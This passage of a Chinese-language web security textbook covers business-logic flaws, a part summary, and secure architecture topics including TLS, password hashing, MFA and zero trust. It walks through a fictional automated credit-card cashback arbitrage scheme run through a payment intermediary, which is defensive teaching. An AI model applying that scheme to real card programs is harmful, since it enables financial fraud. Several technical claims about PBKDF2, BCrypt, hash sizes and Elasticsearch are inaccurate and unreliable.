然而，有时主要功能可能容易受到业务逻辑漏洞的影响，特别是当主要功能涉及多个相互协作的系统时。在信用卡行业中，业务逻辑漏洞最常见（且成本最高）的形式之一是准现金（quasi-cash）交易漏洞。

考虑以下由我们的示例公司 MegaBank 提供的信用卡。这张卡被称为 MegaCard，它具有以下属性：

* 25% APR（年化利率）
* $0 年费
* 所有消费 5% 的返现（前三年）

这是 MegaBank 向其客户提供的第一张卡。它是内部开发的，而不是 MegaBank 销售由 Visa 或 Mastercard 等成熟的主要发卡机构生产的产品。

其设想是，MegaBank 从其其他业务部门赚取了非常多的资金，以至于该卡推出后的前三年里，5% 的年度返现将得到适当的资金支持，以便吸引新客户。可以假定所有竞争对手都提供较低的返现率，因此这一税率将推动 MegaCard 迅速占领大众市场。

Henry Hacker 看到了高额返现率，并决定办理一张 MegaCard。起初，他对非常高的返现率感到满意，但在被 EvilCorp 解雇后，他变得极度渴望现金。

在 EvilCorp 工作期间，他花了不少时间研究用于将替代数字支付方法集成到 EvilCorp 业务部门的 API。这些工具之一被称为 PayBuddy。它提供了一个在线门户，商家可以在其中注册、创建账单、收取款项，并将收入直接存入商业银行账户。

PayBuddy 仅收取每笔交易 1% 的手续费，这使其对 Henry 先前的雇主 EvilCorp 很有吸引力。在学习如何使用 PayBuddy 的 API 的同时，Henry Hacker 建立了他自己的商家账户，将其连接到他的银行账户，并在下班后将其用于测试。

在最近被 EvilCorp 解雇后不久，Henry 想到了一个主意：

1. 使用他在 PayBuddy 上的商家账户，Henry 将为一分钟的咨询创建一个 $1,000 的账单。
2. 随后他将用他的 MegaCard 支付该 $1,000 的账单。
3. 现在，他的 MegaCard 上将有 $1,000 的借记，但在他的商家账户中将有 $990 的贷记（$1,000，扣除 1% 的手续费）。
4. 接下来，他将获得 $1,000 消费的 5%（卡返利）即 $50 报销到他的个人银行账户。
5. 在第 4 步之后，Henry 将把 $990 从 PayBuddy 转账到他的个人银行账户。
6. 最终，Henry 的个人银行账户将包含 $1,040（来自 PayBuddy 的 $990 和来自 MegaCard 的 $50 返利），这比他开始时多了 $40。

通过一遍又一遍地重复这一系列交易，Henry 每个周期都会向他的个人银行账户不断增加 $40 的净资产。手动操作的话，这将是一个缓慢而繁琐的过程。然而，Henry Hacker 创建了一个能够每分钟重复一次上述所有步骤的脚本。有了这种自动化，他现在每小时可以赚取 $2,400 的 MegaCard 返利。在短短 24 小时内，Henry 就可以通过这个漏洞赚取 $57,600 的返利——足够支付他一整年的房租。

作为最后一步，Henry 在 MegaBank 注意到之前兑现了他的余额。MegaBank 只能硬着头皮承担这笔账单，因为从技术上讲，Henry 并没有违反其服务协议中的任何规则。

在这种情况下，MegaCard 按设计工作。该卡是“安全的”，启用了 5% 的消费返现，并且易于使用。MegaCard 的设计没有考虑到的是，MegaCard 的客户同时也是商家的用例，从而能够对自己进行快速、自动化的购买。

这被称为准现金交易漏洞，因为 PayBuddy 并不是真正的银行账户。相反，它是一个金融中介，允许程序化的商业交易，这些交易最终将用真金白银结算，但眼下，它们实际上只是数据库中的字段。

如果 MegaCard 单独存在于更传统（非数字）的经济中，Henry Hacker 很可能会以极易预测的方式执行交易。购买食品百货、看电影或在餐厅就餐，是 MegaBank 假设 Henry Hacker 为了利用这张新信用卡而会参与的活动。

不幸的是，由于 MegaBank 没有在运行于 MegaCard 服务器上的应用逻辑中包含制衡机制，Henry 能够利用这一业务逻辑漏洞赚取数万美元。

### 脆弱的标准与惯例

取决于你所针对的应用程序，业务逻辑漏洞的范围可以从容易识别到需要大量的领域特定知识才能识别。然而，你可以应用一些技巧来使寻找这些漏洞变得更容易一些。这些技巧通常表现为程序员在不理解其影响的情况下所使用的常见反模式所产生的边界情况。让我们讨论一下数值精度丢失（Numeric precision loss），这就是其中一个技巧。

如前所述，业务逻辑漏洞通常涉及某种形式的数学操作，该操作要么没有正确处理输入，要么结构不正确并导致了非预期的输出。如果代码在某个你没有访问权限的服务器上执行——可能很难正确猜测数学函数的结构以及考虑了哪些边界情况。

幸运的是，因为数学是一个标准化的系统，一些常见的错误可能会引导你找到逻辑漏洞。其中一个例子源于理解大多数编程语言如何处理数字。

几乎所有主流编程语言都使用 IEEE754 浮点数格式（IEEE754 floating-point numeric format）（JavaScript、Java、Ruby、Python 等）。使用这种数值格式是因为计算机中的内存稀缺（或至少曾经稀缺），从而导致需要更高效的方法来存储极长的数字，而不是简单地在内存中存储每一位。

与通过使用浮点（可变位置的小数点与固定位置的小数点相比）并依赖科学计数法来表示数字的其他格式相比，IEEE754 提供了一种高效的数字存储机制。那么使用 IEEE754 有什么缺点呢？

你看，为了实现更节省内存的数字存储，IEEE754 做出了权衡，即它牺牲了精度以换取空间。这意味着，在任何涉及小数点的计算中，其结果值可能是近似值，而不是与真实的数学结果完全等同。

尝试以下步骤：

1. 打开 Chrome Web 浏览器。
2. 导航到开发者工具（通常是 F12 快捷键）。
3. 单击 Console（控制台）选项卡。
4. 针对 Chrome 的 V8 JavaScript 解释器执行 JavaScript 代码。
5. 输入以下代码：`0.1 + 0.2`。
6. 单击 Enter（回车）。

你会期望 JavaScript 解释器在这种情况下返回正确的数学结果 `0.3`，但相反，它返回了 `0.30000000000000004`。发生这种情况是因为 IEEE754 数值格式无法表示 `0.1 + 0.2` 的和，所以它用精度丢失来近似表示结果。

在这种情况下，精度丢失为 `0.0000000000000004`，这是一个非常小的数字，在大多数情况下不会导致任何不当计算。然而，在处理金融计算时——尤其是快速自动化的计算——这种计算错误可能会在短时间内累积成一笔可观的金额。

想象一个在重新加载时重新计算用户账户余额的金融服务应用程序。如果 `0.0000000000000004` 的误差范围只是简单地加到余额中，那么需要数百万次重新计算才能使真实余额和记录余额产生显着差异。

另一方面，如果涉及更复杂的计算，其中总和被相乘或者更糟，被求幂，这可能会非常快地失去控制，导致记录余额和实际余额之间产生极端差异。因此，许多业务逻辑漏洞源于不当的数学计算。了解数学操作通常如何实现，将使你在 Web 应用程序中寻找这些漏洞时获得优势。

总而言之，虽然业务逻辑漏洞是应用程序业务逻辑所特有的，但大多数应用程序在实现上具有相似性，这些相似性可用于深入了解业务逻辑漏洞可能存在于何处。

在这种情况下，通过了解编程语言默认如何处理浮点数，为你提供了开始进行手动测试的攻击面。

### 利用业务逻辑漏洞

现在我们已经看了一些业务逻辑漏洞，显而易见的是，逻辑漏洞很难进行具体分类，因为它们与特定应用程序的特定预期用例紧密绑定。

当试图使用业务逻辑漏洞攻击 Web 应用程序时，你需要做的第一件事是极度熟悉该应用程序的预期用例。使用 MegaCard 的例子——将你的思想定位为：你就是 MegaBank 的典型 MegaCard 客户。你想用这张卡购买食品百货、看电影和在外就餐。

写下你能想到的关于该应用程序或技术的每一个预期用例。然后，对于每一个预期用例，确保详细说明你设想它在后端（在应用逻辑中）是如何工作的。

例如，MegaCard 的笔记可能看起来像这样：

1. 我使用我的 MegaCard 在 FoodCo 购买食品百货。
2. 一旦我刷卡，MegaBank 和 FoodCo 之间就会执行某种类型的网络握手。
3. MegaBank 的数据库增加一笔等同于我所购买食物价值的对我的卡的借记，这稍后会在我付清余额时与我的银行账户结算。
4. MegaBank 的服务器计算出等同于食物购买金额 5% 的金额，并在单独的交易中，将其存入我的个人银行账户。

更复杂的应用程序功能（如市场操纵示例）将需要显着更多的时间和精力来理解和勾勒出来。一旦你勾勒出了所有的预期功能以及你对该应用程序在服务器内部如何运行的最佳猜测，现在你就准备好开始规划攻击了。

对于你记录的每一个功能，考虑可能没有得到妥善解决的边界情况。这些可能看起来像下面这样：

* 如果我以加币（CAD）购买 $1,000 的食品百货，我会得到 5% 的加币返现（$50）换算成美元（USD）吗？还是会发生货币兑换？
* 如果我使用 PayBuddy 建立一个在线商家店铺，鉴于手续费与返利之间的差异（1% 对比 5%），我是否能够在零成本交易中净赚 4%？
* 如果我建立一个在线商家账户，我是否可以执行 –$1,000 的负账单，向我的信用卡余额增加资金而不是扣除资金？
* 如果我购买然后立即退款，我是否仍会保留所提供的 5% 返利？

当考虑通过业务逻辑漏洞利用 MegaCard 时，这些边界情况就是你最初的攻击矢量。

如先前的示例所示，利用业务逻辑漏洞最常见的方法是寻找在应用程序代码中没有得到妥善处理的业务逻辑边界情况。

### 总结

业务逻辑漏洞属于在 Web 应用程序中发现难度最高的高级漏洞形式，但它们往往也最频繁地由渗透测试人员和漏洞赏金猎人展示出来。这些漏洞通常具有显着的影响，并且很难或不可能以自动化的方式检测出来。

在本书的前面，你学习了许多使用常见和标准攻击形式来攻击 Web 应用程序的方法。但要真正建立精通并成为一名专家渗透测试人员或漏洞赏金猎人，你需要开始冒险进入发现业务逻辑漏洞的领域。

发现业务逻辑漏洞通常需要真正的独创性、创造力和跳出固有思维模式的能力。如果你能掌握发现这些漏洞的技能，我相信你会发现你的技能组合将具有极高的需求。

***

## 第 19 章 第二部分总结

当今的 Web 应用程序承载着大量的漏洞。其中一些漏洞很容易分类，例如我们在第二部分中评估和测试的漏洞。其他漏洞则更偏向于小众——如果该应用程序具有罕见的安全模型，或者拥有在其他地方找不到的独特架构特征，那么这些漏洞就是该应用程序所特有的。

归根结底，对 Web 应用程序进行彻底的测试，将需要常见漏洞类型方面的知识、批判性思维技能以及领域知识，以便发现最常见类型之外的深层逻辑漏洞。第一部分和第二部分中介绍的基础技能，应该足以让你在未来参与的任何 Web 应用程序安全渗透测试（Penetration testing）项目中顺利运行。

从现在开始，请关注你所测试的任何应用程序中的业务模型。所有应用程序都面临着诸如 XSS、CSRF 或 XXE 等漏洞的风险，但只有通过深入理解应用程序中底层的业务模型和业务逻辑，你才能识别出更高级和更特异的漏洞。

如果在第二部分中介绍的漏洞让你觉得在真实场景中很难应用，请思考为什么会这样。你所测试的任何应用程序很可能都经过了彻底的加固，但更有可能的是，虽然你已经掌握了开发和部署这些攻击的知识，但你可能需要进一步提高或应用你的侦察技能（Recon skills），以便在应用程序中找到可以成功部署这些攻击的薄弱环节。

本书第二部分中所学的技能直接构建在第一部分技能的基础之上。此外，当你继续阅读本书关于 Web 应用程序安全的最后一部分：保护免受攻击的防御机制（Defensive mechanisms）时，这些技能也会对你大有裨益。

在继续阅读本书的最后一部分时，请将目前开发出来的侦察技术和主动黑客攻击技术都牢记在心。当你阅读防御示例时，不断地在脑海中思考黑客在有和没有妥善防御的情况下，会如何发现并利用应用程序。

你会学到，Web 应用程序的防御往往是破碎的，这就是为什么它们经常被称为“缓解措施（mitigations）”而不是“修复方案（fixes）”。利用第一部分和第二部分的知识，你也许能够确定在第三部分中绕过或软化特定防御的方法。第三部分中介绍的防御在很大程度上被认为是行业内的最佳实践，但许多防御并不是万无一失的，并且往往应该将多种防御结合起来，而不是一次仅依赖一种。

最后需要指出的是，第二部分中介绍的技术确实是危险的。这些是真实攻击者定期使用的真实攻击。欢迎你在自己的 Web 应用程序上测试它们，但请不要在没有获得 Web 应用程序所有者明确书面许可的情况下，针对他人拥有的 Web 应用程序测试它们。

前几章中的技术既可以用于善，也可以用于恶。因此，这些技术的应用和使用必须经过深思熟虑，而不能凭一时冲动部署。

即使在获得了应用程序所有者许可的情况下，其中几项技术也可能导致服务器或客户端机器受损。请牢记每一次具体攻击的影响，并在开始前确保应用程序所有者理解实机测试所涉及的风险。

---

# 第三部分：防御

这是《Web应用安全》（*Web Application Security*）的最后一部分。在第一部分和第二部的基础上，我们将深入分析构建现代全栈 Web 应用的要素。在分析的每个环节，我们都会考虑重大的安全风险和隐患。针对这些隐患，我们将评估各种替代实现方案以及能够降低安全风险的缓解措施（Mitigation）。

在此过程中，您将学习到可以融入到软件开发生命周期（Software Development Life Cycle，SDLC）中的技术，以减少生产环境代码中的漏洞。这些技术范围广泛，从默认安全（Secure-by-Default）的应用架构、避免不安全的反模式（Anti-Patterns），一直到恰当的、以安全为导向的代码审计（Code Review）技术以及针对特定漏洞利用类型的应对措施。

到第三部分结束时，您将在 Web 应用侦察（Reconnaissance）、攻防渗透测试（Penetration Testing / Pen-testing）技术以及安全软件开发方面打下坚实的基础。届时，我鼓励您带着更丰富的背景知识重新阅读前两部分中感兴趣的内容，或者直接将您的新技能应用到现实世界中。

让我们继续前进，开始学习软件安全以及构建防御黑客的 Web 应用所需的技能。

---

## 第 20 章 保障现代Web应用的安全
到目前为止，我们已经花费了大量时间来分析可用于研究、分析和攻破 Web 应用的技术。这些准备技术本身就非常重要，并且在我们进入本书的第三部分也是最后一部分——防御时，为我们提供了重要的洞察。

与以往的系统相比，当今的 Web 应用更加复杂且分布更广。与较旧的、采用服务端渲染（Server-Side Rendering）且几乎没有用户交互的单体（Monolithic）Web 应用相比，这扩大了攻击面。这也是我将本书结构设计为先介绍侦察，接着是攻击，最后是防御的原因。

我认为，了解 Web 应用的攻击面，并理解潜在黑客如何对该攻击面进行资产测绘与分析是至关重要的。除此之外，对于任何想要保障 Web 应用安全的人来说，理解黑客用来突破 Web 应用的技术也是必不可少的知识。通过理解黑客入侵 Web 应用的方法论，您应该能够推导出如何优先配置防御措施，并对您的应用架构和逻辑进行伪装，使其免受恶意窥探。

我们在本书中讨论过的所有技能和技术都是相辅相成的。提升您在侦察、攻击或防御方面的掌握程度，都将极大地提高您时间的使用效率。

防御 Web 应用在某种程度上类似于防守一座中世纪的城堡。一座城堡由许多建筑物和城墙组成，它们代表了应用的核心代码。城堡外部有许多与城堡主人（通常是领主）进行整合并为其提供支持的建筑，这形象地描述了应用的依赖项（Dependencies）和集成。由于城堡及周边领土的攻击面巨大，在战争时期，对防御措施进行优先级排序至关重要；在每一个潜在的入口点都最大化防御工事是不切实际的。

在 Web 应用安全领域，这种优先级排序和漏洞管理（Vulnerability Management）在大型企业中通常是安全工程师的工作，在小型公司中则往往由更通用的软件工程师承担。这些专业人员扮演着防守大师的角色，他们结合软件工程技能、侦察以及黑客技术，来降低成功攻击的概率，减轻潜在损失，并对正在发生或已经发生的损害进行控制。

### 防御性软件架构

编写一个防守严密的 Web 应用，其第一步在实际编写任何软件之前就已经开始了。这就是架构设计阶段。在任何新产品或新功能的架构设计阶段，都应该对贯穿整个应用的数据流投入极大的关注。

可以说，大部分软件工程的核心就是将数据高效地从 A 点传输到 B 点。同理，大部分安全工程的核心，就是确保数据在从 A 点到 B 点的传输过程中，以及在该传输之前、之后或期间的任何存储位置，都能得到高效的安全保障。

在实际编写和部署软件之前，发现并解决深层的架构安全缺陷要容易得多。在应用被用户采用之后，通过重构架构来解决安全差距的深度往往会受到极大的限制。

对于可供消费者在其上进行二次开发的任何类型的 Web 应用而言，情况尤其如此。如果 Web 应用允许用户开设自己的店铺、运行自己的代码等，重构其架构的成本可能会极高，因为深层的架构重构可能需要客户重新进行许多耗时的手动配置。

在接下来的章节中，我们将学习许多正确评估应用架构安全性的技术。这些技术涵盖了从数据流分析到针对新功能的威胁建模（Threat Modeling）。

### 全面的代码审计

在实际编写已被评估为安全架构的 Web 应用的过程中，下一步是在发布到代码库之前仔细评估每一次提交（Commit）。大多数公司已经采用了强制性的代码审计流程，以提高质量保证（Quality Assurance）、减少技术债（Technical Debt）并消除易于发现的编程错误。

代码审计也是确保发布的代码符合安全标准的关键步骤。为了减少利益冲突（Conflict of Interest），向源代码版本控制（Version Control）系统提交的代码不仅应由提交者所在团队的成员进行审查，还应由一个不相关的团队进行审查（特别是在安全方面）。

在代码审计级别，针对每一次提交来捕获安全漏洞实际上比人们想象的要容易。需要注意的主要重点是：

* 数据是如何从 A 点传输到 B 点的（通常是通过网络，并采用特定格式）？
* 我们如何处理凭证（Credentials）的存储？
* 我们如何处理用户的各种授权级别？

---

## 第 21 章 安全的应用架构
保障 Web 应用安全的第一步是架构阶段。在构建产品时，由软件工程师和产品经理组成的跨职能团队通常会协同合作，以寻找一种能够高效服务于特定业务目标的底层技术模型。在软件工程中，架构师的角色是对模块进行高层设计，并评估模块之间进行通信的最佳方式。这可以延伸到确定存储数据的最佳方式、依赖哪些第三方依赖项、整个代码库中应当主导何种编程范式等。

与建筑架构师类似，软件架构是一项微妙的工作，蕴含着巨大的风险，因为一旦应用构建完成，重构架构和代码重构（Refactor）都是极其昂贵的过程。安全架构与软件或建筑架构具有相似的风险特征。通常，通过仔细的规划和评估，在架构阶段可以很容易地预防漏洞。然而，如果规划不足，就必须对应用代码进行重构，这往往会给企业带来高昂的成本。

美国国家标准与技术研究院（National Institute of Standards and Technology，NIST）在一项针对流行 Web 应用的研究中声称：“在设计阶段消除应用安全漏洞的成本，比在生产环境中消除要便宜 30 到 60 倍。”这无疑巩固了我们对架构阶段重要性的认识。

### 分析功能需求

确保产品或功能架构安全的第一步，是收集该产品或功能预期实现的所有业务需求。在甚至还未考虑将业务需求集成到 Web 应用中之前，就可以对其进行风险评估。

> 任何设有独立安全团队和研发团队的组织，都应确保在开发流程中建立两者之间的沟通路径。功能无法在孤岛中得到恰当的分析，这种分析应当包括来自工程以及产品开发部门的利害关系人。

考虑这样一个业务案例：在清理了其代码库中的多个安全漏洞后，MegaBank 决定利用其新获得的知名度，开始打造自己的周边品牌。MegaBank 的新周边品牌 MegaMerch 将推出一系列高品质纯棉 T 恤、舒适的棉弹卫裤以及印有 MegaMerch (MM) 徽标的男女泳装。

为了在新的 MegaMerch 品牌下分销周边商品，MegaBank 希望建立一个满足以下需求的电子商务应用：

* 用户可以创建账户并登录。
* 用户账户包含用户的完整姓名、地址和出生日期。
* 用户可以访问展示商品的商店首页。
* 用户可以搜索特定商品。
* 用户可以保存信用卡和银行账户以便日后使用。

对这些需求进行高层分析，可以为我们提供一些重要的信息碎片：

* 我们正在存储凭证。
* 我们正在存储个人身份信息（PII）。
* 与访客相比，用户拥有更高的权限。
* 用户可以搜索现有商品。
* 我们正在存储财务数据。

这些点虽然并无特别之处，但能让我们初步分析出如果架构设计不当，该应用可能会遇到哪些潜在风险。从该分析中得出的一些风险领域如下：

**身份验证与授权 (Authentication and authorization)**
> 我们如何处理会话（Sessions）、登录和 Cookie？

**个人数据 (Personal data)**
> 它的处理方式是否与其他数据不同？法律是否会影响我们处理这些数据的方式？

**搜索引擎 (Search engine)**
> 搜索引擎是如何实现的？它是从主数据库提取数据作为其唯一事实来源，还是使用独立的缓存数据库？

这些风险中的每一个都会引出许多关于实现细节的问题，这为安全工程师提供了一个切入点，以协助应用向更安全的方向发展。

### 身份验证与授权

因为我们要存储凭证，并为访客和注册用户提供不同的用户体验，所以我们知道我们同时拥有身份验证和授权系统。这意味着我们必须允许用户登录，并且在确定允许这些用户执行哪些操作时，能够区分不同层级的用户。

此外，由于我们要存储凭证并支持登录流程，我们知道凭证将在网络上传输。这些凭证也必须存储在数据库中，否则身份验证流程将无法运转。

这意味着我们必须考虑以下风险：

* 我们如何处理传输中的数据？
* 我们如何处理凭证的存储？
* 我们如何处理用户的各种授权级别？

#### 安全套接字层与传输层安全

由于我们已经识别出了风险，需要应对的最重要的架构决策之一就是如何处理传输中的数据。传输中的数据是架构评审期间的一项重要第一步评估，因为它会影响整个 Web 应用中所有数据流的安全。

初始的传输中数据需求应当是：在网络上传输的所有数据在途中都必须进行加密。这降低了中间人（Man-in-the-Middle）攻击的风险，这种攻击可能会窃取我们用户的凭证并代表他们进行购买（因为我们存储了他们的财务数据）。

安全套接字层（Secure Sockets Layer，SSL）和传输层安全（Transport Layer Security，TLS）是当今用于保护传输中数据免受网络中恶意窥探的两种主要加密协议。SSL 由网景公司（Netscape）于 20 世纪 90 年代中期设计，自那时起已发布了该协议的多个版本。

TLS 由 RFC 2246 于 1999 年定义，旨在应对 SSL 中的若干架构问题并提供升级的安全保障。由于两者之间存在大量的架构差异，TLS 无法与旧版本的 SSL 进行交互。TLS 提供了最严格的安全保障，而 SSL 虽然采用率较高，但存在多个降低其作为加密协议完整性的漏洞。

当网站的通信通过 SSL 或 TLS 得到妥善保护时，如今的所有主流浏览器都会在 URL 地址栏中显示一个锁形图标。HTTP 规范提供了 "HTTPS" 或 "HTTP Secure"（一种统一资源标识符，即 URI 方案），它要求在允许通过网络发送任何数据之前必须存在 TLS/SSL。当发出 HTTPS 请求时，如果 TLS/SSL 连接遭到破坏，支持 HTTPS 的浏览器将向终端用户显示警告。

对于 MegaMerch，我们希望确保所有数据在通过网络发送之前都经过加密且兼容 TLS。TLS 的实现方式通常因服务器而异，但每个主流的 Web 服务器软件套件都提供了轻松集成的方案来开始对 Web 流量进行加密。

#### 安全的凭证

密码安全需求的存在有诸多原因，但不幸的是，大多数开发人员并不理解是什么让密码能够抵御黑客。创建安全的密码与长度和特殊字符的数量关系不大，而是完全取决于密码中可以找到的规律。在密码学中，这被称为熵（Entropy）——即随机性和不确定性的程度。您需要具有高熵的密码。

信不信由你，网络上使用的大多数密码都不是唯一的。当黑客试图对 Web 应用的登录进行暴力破解（Brute Force）时，最简单的途径是找到最常用密码的列表，并使用该列表进行字典攻击（Dictionary Attack）。高级字典攻击还会包含常用密码的组合、常见的密码结构以及常见的密码组合。除此之外，经典的暴力破解涉及遍历所有可能的组合。

如您所见，保护您的与其说是密码的长度，不如说是缺乏可观察的规律以及避免使用常用词汇和短语。不幸的是，很难向用户传达这一点。相反，我们应该通过设置某些要求，让用户很难创建包含许多已知规律的密码。

例如，我们可以拒绝前 1000 个常用密码列表中的任何密码，并告知用户该密码过于常见。我们还应该阻止用户使用出生日期、名字、姓氏或地址的任何部分。在 MegaMerch，我们可以在注册时要求输入名字、姓氏和出生日期，并阻止在用户密码中允许使用这些信息。

#### 凭证哈希

在存储敏感凭证时，我们绝不能以明文形式存储。相反，我们应该在第一次看到密码时，在存储之前对其进行哈希（Hash）处理。哈希密码并不是一个复杂的过程，而其带来的安全收益是巨大的。

哈希算法与大多数加密算法的不同之处在于几个方面。首先，哈希算法是不可逆的。这是处理密码时的关键点。我们不希望甚至我们自己的员工也能够窃取用户密码，因为他们可能会在其他地方使用这些密码（这是一种坏习惯，但很常见），并且在出现内鬼员工的情况下，我们不希望承担这种法律责任。

其次，现代哈希算法极其高效。今天的哈希算法仅用 128 到 264 位的数据就可以表示多兆字节的字符文本。这意味着，当我们进行密码校验时，我们将在登录时重新对用户输入的密码进行哈希，并将其与数据库中的哈希密码进行比较。即使密码极长，我们也能以极高的速度完成检索。

使用哈希的另一个关键优势是，现代哈希算法在实际应用中几乎没有冲突（Collision）（碰撞次数为 0，或在统计学上趋近于 0，即 $1/1,000,000,000+$）。这意味着您可以在数学上确定，两个密码产生相同哈希值的概率将极低。因此，您无需担心黑客会“猜出”密码，除非他们猜中了另一个用户的确切密码。

如果数据库被入侵且数据被盗，妥善哈希的密码可以保护您的用户。黑客将只能访问哈希值，并且极不可能逆向工程出您数据库中的哪怕一个密码。

让我们考虑黑客获取 MegaMerch 数据库访问权限的三种情况：

**案例 #1**
> 密码以明文形式存储

**结果**
> 所有密码全部泄露

**案例 #2**
> 密码使用 MD5 算法进行哈希

**结果**
> 黑客可以使用彩虹表（Rainbow Tables，一种预先计算好的 哈希 $\rightarrow$ 密码 对应表；较弱的哈希算法容易受到这种攻击）破解部分密码

**案例 #3**
> 密码使用 BCrypt 进行哈希

**结果**
> 几乎不可能有密码被破解

如您所见，所有密码都应该进行哈希。此外，还应根据哈希算法的数学完整性以及在现代硬件上的可扩展性对其进行评估。在哈希时，算法在现代硬件上的运行速度应当是**慢**的，从而减少黑客每秒可以进行的尝试次数。

在破解密码时，慢哈希算法至关重要，因为黑客将使“密码到哈希”的过程自动化。一旦黑客找到了与密码相同的哈希值（忽略潜在的冲突），该密码就实际上被攻破了。在现代硬件上，像 BCrypt 这样哈希极其缓慢的算法可能需要数年或更长时间才能破解一个密码。

现代 Web 应用应考虑使用以下哈希算法来保护用户凭证的完整性。

##### BCrypt
BCrypt 是一种哈希函数，其名称源于两项成果：其中的 "B" 来自 Blowfish Cipher（由 Bruce Schneier 于 1993 年开发的对称密钥分组密码，设计为通用且开源的加密算法）；"Crypt" 是早期 Unix 操作系统自带的默认哈希函数的名称。

Crypt 哈希函数在编写时考虑到了早期的 Unix 硬件，这意味着当时硬件每秒无法哈希足够数量的密码，因而无法使用 Crypt 函数逆向工程出哈希后的密码。在其开发之初，Crypt 每秒哈希的密码不足 10 个。而在现代硬件上，Crypt 函数可用于每秒哈希数万个密码。这使得任何当今时代的黑客都可以轻松破解由 Crypt 哈希的密码。

BCrypt 对 Blowfish 和 Crypt 进行了迭代，提供了一种在更快的硬件上反而运行得更慢的哈希算法。由 BCrypt 哈希的密码面向未来具有良好的扩展性，因为尝试使用 BCrypt 进行哈希的硬件越强大，所需的计算步骤就越多。因此，如今的黑客几乎不可能编写出一个能够通过暴力破解运行足够多的哈希、进而匹配上复杂密码的脚本。

##### PBKDF2
作为 BCrypt 的替代方案，PBKDF2 哈希算法也可用于保障密码安全。PBKDF2 基于一个被称为密钥拉伸（Key Stretching）的概念。密钥拉伸算法会在第一次尝试时迅速生成哈希，但每一次额外的尝试都会变得越来越慢。因此，PBKDF2 使得暴力破解成为一个高计算成本的过程。PBKDF2 最初并非专为密码哈希而设计，但在无法使用类似 BCrypt 的算法时，它足以胜任密码哈希工作。

PBKDF2 接受一个配置选项，该选项代表生成哈希的最小迭代次数。此最小值应始终设置为您的硬件能够处理的最大迭代次数。您永远无法预知黑客可能拥有何种硬件，因此，通过将哈希的最小迭代次数设置为您硬件的最大承受值，您就消除了在更快硬件上潜在的迭代优势，并杜绝了在更慢硬件上的任何尝试。

在对 MegaMerch 的评估中，我们决定使用 BCrypt 对我们的密码进行哈希，并且仅比对密码哈希值。

#### 多因素身份验证

除了要求在传输中加密并进行哈希的安全密码外，我们还应该考虑向希望确保其账户完整性不被破坏的用户提供多因素身份验证（Multifactor Authentication，MFA）。图 21-2 显示了 Google Authenticator（谷歌身份验证器），这是 Android 和 iOS 上最常用的 MFA 应用之一。它与许多网站兼容，并提供了一个用于集成到您的应用中的开放 API。MFA 是一项极佳的安全功能，它基于一个非常简单的原理，运行得非常高效。

大多数 MFA 系统要求用户在浏览器中输入密码之外，还要输入由移动端应用或 SMS 短信生成的动态密码。更高级的 MFA 协议实际上会使用物理硬件令牌（通常是一个 USB 闪存盘，当插入用户电脑时会生成一个独特的一次性令牌）。通常来说，物理令牌更适用于企业的员工，而非其普通用户。为一个电子商务平台分发和管理物理令牌，对所有相关人员来说都将是一次痛苦的体验。基于手机 App/SMS 的 MFA 可能不如专用的 MFA USB 令牌安全，但其带来的收益仍然比不使用 MFA 的应用要安全上一个数量级。

在 MFA 应用或消息传输协议本身不存在任何漏洞的情况下，MFA 杜绝了非账户所有者发起的对您 Web 应用的远程登录。攻破一个启用了 MFA 账户 constituency 的唯一方法，是同时获取账户密码以及包含 MFA 验证码的物理设备（通常是手机）。

在与 MegaMerch 的架构评审期间，我们强烈建议向希望提高其 MegaMerch 账户安全性的用户提供 MFA。

### 个人身份信息与财务数据

当我们存储用户的个人身份信息（PII）时，我们需要确保这种存储在我们运营的国家是合法的，并且我们遵守了这些国家适用于 PII 存储的任何法律。除此之外，我们要确保在数据库泄露或服务器被攻破的情况下，PII 不会以易被滥用的格式暴露。适用于 PII 的类似规则也适用于财务数据，例如信用卡号（在某些国家的 PII 法律中也包含这些数据）。

一个规模较小的公司可能会发现，与其自行存储 PII 和财务细节，更有效的策略可能是将此类数据的存储外包给一家专门从事该类型数据存储且符合合规要求的企业。

### 搜索引擎

任何实现自己定制搜索引擎的 Web 应用都应该考虑这项任务带来的影响。搜索引擎通常要求以一种能使特定查询非常高效的方式来存储数据。搜索引擎中理想的数据存储方式，与通用数据库中理想的数据存储方式大不相同。

因此，大多数实现搜索引擎的 Web 应用都需要一个独立的数据库，搜索引擎从中提取数据。显而易见，这可能会引起许多复杂情况，需要提前进行妥善的安全架构设计，而不是留到以后解决。

同步任何两个数据库都是一项重大的工程。如果主数据库中的权限模型更新了，搜索引擎的数据库必须同步更新以反映主数据库中的更改。

此外，引入到代码库中的 Bug 可能会导致某些模型在主数据库中被删除，但未在搜索数据库中删除。或者，在对象从主数据库中移除后，搜索数据库中关于该特定对象的元数据（Metadata）可能仍然是可搜索的。

在实现搜索时，这些都是应该在部署任何搜索引擎之前明确考虑的隐患，无论是使用 Elasticsearch 还是自研解决方案。Elasticsearch 是目前规模最大、应用最广泛的开源分布式搜索（图 21-3）。它易于配置、文档详尽，且可以在任何应用中免费使用。它构建在 Apache 的 Solr 搜索引擎项目之上。`

### 零信任架构

零信任架构（Zero Trust Architecture）是将一种被称为“零信任”的哲学应用于软件架构。这两个术语在这里可以互换使用。通常，零信任架构有许多不同的名称：

* 零信任（Zero Trust）
* 零信任网络访问（Zero Trust Network Access，ZTNA）
* 零信任设计（Zero Trust Design）
* 零信任模式（Zero Trust Pattern）
* 零信任设计模式（Zero Trust Design Pattern）

所有这些术语都指向同一组设计原则，我们将在本节中对其进行讨论。

#### 零信任的历史

“零信任”这一术语最早出现于计算机科学家 Stephen Paul Marsh 1994 年在斯特林大学（苏格兰）撰写的博士论文中。Stephen 认为，信任的概念可以分解为计算机可以计算的有限条件集。在 Stephen 的博士论文发表后不久，“零信任”这一术语淡出了常用口语，直到 2018 年才重新出现。

2020 年，NIST 发表了一篇名为《零信任架构》（*Zero Trust Architecture*, SP-800-207）的白皮书。该出版物重新激发了对“零信任”一词的使用，使其在发表后的数年里成为被检索最广泛的信息安全词汇之一。如今，在安全环境中使用时，零信任大多是指 2020 年 NIST 同名白皮书中撰写的指南。

#### 隐式信任与显式信任

零信任架构的核心是开发安全应用的一种设计模式。零信任主要通过聚焦于两种主要类型的“信任”来将自身与其他设计模式区分开来：隐式信任和显式信任。在前文提到的 NIST 白皮书中，隐式信任被定义为基于物理临近性（Proximity）或角色而授予的信任。

